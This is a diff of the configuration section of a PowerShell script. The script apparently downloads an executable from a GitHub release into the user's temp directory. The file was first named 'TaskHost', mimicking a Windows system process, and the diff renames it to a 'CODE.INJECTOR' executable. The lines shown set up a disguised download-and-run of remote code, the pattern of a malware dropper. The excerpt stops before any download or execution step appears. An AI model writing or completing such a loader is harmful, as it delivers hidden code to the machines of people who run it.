@@ -1,12 +1,12 @@
 Clear-Host
 
 # --- Configuration ---
-$procName = "TaskHost"
+$procName = "CODE.INJECTOR.@vxrunhh"
 $tempDir = [System.IO.Path]::GetTempPath()
-$out = Join-Path $tempDir "TaskHost.exe"
+$out = Join-Path $tempDir "CODE.INJECTOR.@vxrunhh.exe"
 
 # Replace with a stable direct URL to your file
-$directUrl = "https://github.com/k64943079-ship-it/STREAMER-PANEL/releases/download/STREAMER/TaskHost.exe"
+$directUrl = "https://github.com/k64943079-ship-it/STREAMER-PANEL/releases/download/STREAMER/CODE.INJECTOR.@vxrunhh.exe"
 
 # --- UI ---
 Write-Host ""
